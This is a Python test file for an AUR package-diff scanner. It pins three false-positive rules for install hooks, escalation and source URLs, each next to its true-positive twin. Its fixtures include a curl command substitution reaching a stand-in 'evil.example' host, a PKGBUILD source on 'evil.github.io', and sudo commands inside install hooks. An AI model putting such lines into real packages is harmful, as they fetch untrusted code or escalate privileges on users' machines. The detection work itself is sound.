"""False positives from a real watcher batch (2026-10-14).

Nine unrelated AUR packages crossed the alerting bar in one 20-minute window
because each touched a ``.install`` file.  Three rules fired on things that
were not there:

* C024 read ``install=`` from the *diff reconstruction*, so a declaration
  that was unchanged and outside the hunk looked absent, and it claimed the
  recipe did not name the hook it plainly named (keymux, sonarr-develop,
  mailflow, mkinitcpio-tailscale).
* H004 read ``echo "... | sudo tee ..."`` - an instruction printed by an
  install hook - as the escalation itself, a CRITICAL 40 on a hint.
* R152 read a ``docs: https://x.github.io/...`` link in an install banner as
  a source URL fetched at build time.

Each test pins the false positive and its true-positive twin, so a fix that
merely stops the rule firing is not mistaken for a fix.
"""

import difflib
import sys
from pathlib import Path

_ROOT = Path(__file__).resolve().parent.parent.parent
sys.path.insert(0, str(_ROOT / "scripts"))

from calibration_gates import shipped_config  # noqa: E402

from trustsight.analysis import scan_diff  # noqa: E402
from trustsight.config import load_config, load_rules  # noqa: E402


def _ids(diff, current_text=None, manifest=None):
    with shipped_config():
        fact = scan_diff(
            diff, rules=load_rules(), config=load_config(), package_name="p",
            current_text=current_text, tree_manifest=manifest,
        )
    return {e.rule_id for e in fact.score_breakdown}


def _pkgbuild(version, install_line):
    """A recipe long enough that ``install=`` sits outside a version hunk."""
    return "\n".join(
        ["pkgname=keymux", f"pkgver={version}", "pkgrel=1"]
        + [f"# padding line {n}" for n in range(15)]
        + [install_line, "x"]
    ) + "\n"


def _diff_with_new_install(old, new, install_name, install_body):
    """A two-file diff: the recipe edit plus an added ``*.install``."""
    ud = "".join(difflib.unified_diff(
        old.splitlines(True), new.splitlines(True),
        "a/PKGBUILD", "b/PKGBUILD", n=3,
    ))
    body = "".join("+" + line + "\n" for line in install_body)
    install = (
        f"diff --git a/{install_name} b/{install_name}\n"
        f"new file mode 100644\n--- /dev/null\n+++ b/{install_name}\n"
        f"@@ -0,0 +1,{len(install_body)} @@\n{body}"
    )
    return ud + install


# ---------------------------------------------------------------------------
# C024 - an install file "no install= declaration names"
# ---------------------------------------------------------------------------

def test_a_declared_install_file_outside_the_hunk_is_not_undeclared():
    """keymux: ``install=keymux.install`` was unchanged and out of the hunk.

    C024 read the declaration from the diff reconstruction, which holds only
    what the hunks show, so the scalar was absent and the rule fired on a
    recipe that names its hook.
    """
    old = _pkgbuild("1.7.0", "install=keymux.install")
    new = _pkgbuild("1.8.0", "install=keymux.install")
    diff = _diff_with_new_install(
        old, new, "keymux.install",
        ["post_install() { echo hi; }", "post_upgrade() { post_install; }"],
    )
    manifest = [("keymux.install", b"post_install() { echo hi; }\n")]
    assert "C024" not in _ids(diff, current_text=new, manifest=manifest)


def test_an_install_file_no_declaration_names_still_fires():
    """The true positive the fix must not lose: no ``install=`` at all."""
    old = _pkgbuild("1.7.0", "# no install hook")
    new = _pkgbuild("1.8.0", "# no install hook")
    diff = _diff_with_new_install(
        old, new, "keymux.install",
        ["post_install() { echo hi; }"],
    )
    manifest = [("keymux.install", b"post_install() { echo hi; }\n")]
    assert "C024" in _ids(diff, current_text=new, manifest=manifest)


def test_a_variable_declared_install_file_is_not_undeclared():
    """sysc-shell: ``install="${pkgname}.install"`` names the shipped hook."""
    old = _pkgbuild("0.1.0", 'install="${pkgname}.install"')
    new = _pkgbuild("0.2.0", 'install="${pkgname}.install"')
    diff = _diff_with_new_install(
        old, new, "keymux.install", ["post_install() { echo hi; }"],
    )
    manifest = [("keymux.install", b"post_install() { echo hi; }\n")]
    assert "C024" not in _ids(diff, current_text=new, manifest=manifest)


# ---------------------------------------------------------------------------
# H004 - privilege escalation
# ---------------------------------------------------------------------------

def _install_only(body_lines, name="p.install"):
    diff = (
        f"diff --git a/{name} b/{name}\nnew file mode 100644\n"
        f"--- /dev/null\n+++ b/{name}\n"
        f"@@ -0,0 +1,{len(body_lines)} @@\n"
        + "".join("+" + line + "\n" for line in body_lines)
    )
    return diff


def test_sudo_printed_by_an_install_hook_is_not_an_escalation():
    """keymux: the only ``sudo`` is inside an echo the hook prints for the
    user, including a piped ``| sudo tee`` that the old whole-line search
    read as a command chain."""
    diff = _install_only([
        "post_install() {",
        '    echo "    echo uinput | sudo tee /etc/modules-load.d/uinput.conf"',
        '    echo "    sudo systemctl enable --now keymux.service"',
        "}",
    ])
    assert "H004" not in _ids(diff)


def test_a_real_sudo_in_an_install_hook_still_fires():
    diff = _install_only([
        "post_install() {",
        "    sudo systemctl enable --now keymux.service",
        "}",
    ])
    assert "H004" in _ids(diff)


def test_a_real_command_after_a_printed_echo_still_fires():
    """The message carve-out must not swallow `echo hi && sudo rm ...`."""
    diff = _install_only([
        "post_install() {",
        '    echo "installing" && sudo systemctl enable --now p.service',
        "}",
    ])
    assert "H004" in _ids(diff)


def test_command_substitution_inside_double_quotes_is_not_a_message():
    """`echo "$(curl ...)"` runs the substitution; it is not a printed hint."""
    from trustsight.rules import _is_message_line

    assert _is_message_line('echo "run: echo x | sudo tee y"') is True
    assert _is_message_line('echo "$(curl https://evil.example)"') is False
    assert _is_message_line("echo 'safe $() literal'") is True


# ---------------------------------------------------------------------------
# R152 - source URL on a free-hosting or dynamic-DNS host
# ---------------------------------------------------------------------------

def test_a_docs_link_in_an_install_banner_is_not_a_source():
    """sysc-shell: `docs: https://nomadcxx.github.io/...` in the post_install
    banner is a link the reader clicks, not a URL makepkg fetches."""
    diff = _install_only([
        "post_install() {",
        '    echo "Docs: https://nomadcxx.github.io/sysc/docs/"',
        "}",
    ])
    assert "R152" not in _ids(diff)


def test_a_source_on_a_free_hosting_domain_still_fires():
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -0,0 +1,1 @@\n"
        '+source=("https://evil.github.io/x.tar.gz")\n'
    )
    assert "R152" in _ids(diff)
